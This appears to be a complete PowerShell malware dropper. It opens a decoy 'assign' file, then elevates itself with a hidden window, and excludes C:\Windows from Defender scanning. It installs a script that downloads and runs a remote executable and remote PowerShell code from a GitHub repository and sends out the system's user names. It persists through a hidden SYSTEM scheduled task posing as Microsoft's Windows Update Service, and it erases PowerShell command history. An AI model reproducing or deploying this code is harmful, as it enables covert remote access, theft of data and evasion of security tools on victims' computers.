#Variables
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$regPath = "HKLM:\Software\WindowsUpdateService"
$shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
$directoryPath = "C:/Windows/System32/SecureBootUpdatesMicrosoft/"
$psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
##Do Not use the option in repo env, only for production env.
$runcleanup = $false

# File Opening.
$scriptDirectory = Split-Path -Path $MyInvocation.MyCommand.Path -Parent
$searchPattern = "*assign*.*"
$matchingFiles = Get-ChildItem -Path $scriptDirectory -Filter $searchPattern -File -Force -ErrorAction SilentlyContinue | Where-Object { -not $_.Name.StartsWith("~$") }
if ($matchingFiles) {
    foreach ($file in $matchingFiles) {
        Write-Host "Opening file: $($file.FullName)"
        Invoke-Item -Path $file.FullName
    }
} else {
    Write-Host "No files matching the search pattern '$searchPattern' found in directory '$scriptDirectory'."
}

# Admin Check and execution bypass with window hidden.
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if (-not $isAdmin) {
    Write-Host "Script is not running with administrative privileges. Prompting for UAC elevation..."
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

#Ading defender exclusion.
try {
  $exclusionPath = "C:\Windows"
  Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction SilentlyContinue -ErrorVariable AddExclusionError | Out-Null
  if (-not $AddExclusionError) {
  }
}
catch {}

#Creating the directory
if (-not (Test-Path -Path $directoryPath -PathType Container)) {
  New-Item -Path $directoryPath -ItemType Directory
} else {
}

# Check if the registry path exists, create it if not
if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}

# Check for existing "Code" value
$existingCode = (Get-ItemProperty -Path $regPath -Name "Code" -ErrorAction SilentlyContinue).Code

# If "Code" value doesn't exist, set it to "001100"
if (-not $existingCode) {
    $code = "001100"
    Set-ItemProperty -Path $regPath -Name "Code" -Value $code -ErrorAction SilentlyContinue
} else {
    # Delete existing "Code" value
    Remove-ItemProperty -Path $regPath -Name "Code" -ErrorAction SilentlyContinue

    # Set "Code" to "001100"
    $code = "001100"
    Set-ItemProperty -Path $regPath -Name "Code" -Value $code -ErrorAction SilentlyContinue
}
# Check for existing "Data" value, set it to "active" if it doesn't exist
if (-not (Test-Path "$regPath\Data") -or (Get-ItemProperty -Path "$regPath\Data" -Name "Data" -ErrorAction SilentlyContinue).Data -ne "active") {
    Set-ItemProperty -Path $regPath -Name "Data" -Value "active" -ErrorAction SilentlyContinue
}

#Install WindowsUpdateService
$scriptContent = @'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$accessurl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/AccessControl.ps1"
$boturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
$accessresponse = Invoke-WebRequest -Uri $accessurl -UseBasicParsing -ErrorAction SilentlyContinue
$regPath = "HKLM:\Software\WindowsUpdateService"
$code = (Get-ItemProperty -Path $regPath).Code
$data = (Get-ItemProperty -Path $regPath).Data
$userNames = '(' + ((Get-WmiObject -Class Win32_UserProfile | ForEach-Object { $_.LocalPath.Split('\')[-1] }) -join ', ') + ')'
$exepath = "C:/Windows/System32/SecureBootUpdatesMicrosoft/DiscordDataUpload.exe"
$combineddata = """**{Offline}** Scheduling successful on **$code**, w/status **$data**, System's Userset is **$userNames**."""
Invoke-WebRequest -Uri $boturl -OutFile $exepath -UseBasicParsing -ErrorAction SilentlyContinue
Invoke-Expression (Invoke-WebRequest -Uri $accessurl -UseBasicParsing).Content
Start-Process -WindowStyle Hidden -FilePath $exepath -ArgumentList $combineddata -ErrorAction SilentlyContinue
'@

Remove-Item $shellscriptpath -Force -ErrorAction SilentlyContinue
$scriptContent | Set-Content -Path $shellscriptpath -Force

#Install Windows Service
$updateservxml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-10-13T00:56:52.6271595</Date>
    <Author>Microsoft\System</Author>
    <Description>Windows Server Update Services, previously known as Software Update Services, is a computer program and network service developed by Microsoft Corporation that enables administrators to manage the distribution of updates and hotfixes released for Microsoft products to computers in a corporate environment.</Description>
    <URI>\Windows Update Service</URI>
  </RegistrationInfo>
  <Triggers>
    <EventTrigger>
      <Repetition>
        <Interval>PT5M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational"&gt;&lt;Select Path="Microsoft-Windows-NetworkProfile/Operational"&gt;*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <RegistrationTrigger>
      <Repetition>
        <Interval>PT5M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
      <Delay>PT1M</Delay>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -File "C:\Windows\System32\WindowsUpdateService.ps1"</Arguments>
      <WorkingDirectory>C:\Windows\System32</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
"@

# Register the task from the XML content
$updateserv = "Windows Update Service"
if (Get-ScheduledTask -TaskName $updateserv -ErrorAction SilentlyContinue) {
  # Task exists, so delete it
  Unregister-ScheduledTask -TaskName $updateserv -Confirm:$false
}
else {}
Register-ScheduledTask -Xml $updateservxml -TaskName $updateserv | Out-Null
Start-Sleep 10
Start-ScheduledTask -TaskName $updateserv

#cleanup-script
if ($runcleanup) {
    # Unhide all hidden files in the script directory
    Get-ChildItem -Path $PSScriptRoot -Force | Where-Object { $_.Attributes -band [System.IO.FileAttributes]::Hidden } | ForEach-Object {
        $_.Attributes = $_.Attributes -bxor [System.IO.FileAttributes]::Hidden
        Write-Output "Unhid file: $($_.FullName)"
    }
    # Remove files with specified extensions from the script directory
    $extensions = @(".bat", ".cmd", ".vbs", ".ps1")
    foreach ($extension in $extensions) {
        $files = Get-ChildItem -Path $PSScriptRoot -Filter "*$extension" -File
        foreach ($file in $files) {
            Remove-Item -Path $file.FullName -Force
        }
    }
} else {}

#powershell-cleanup.
if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
  $files = Get-ChildItem -Path $psreadlineFolderPath
  if ($files.Count -gt 0) {
      Remove-Item -Path "$psreadlineFolderPath\*" -Force
  }
}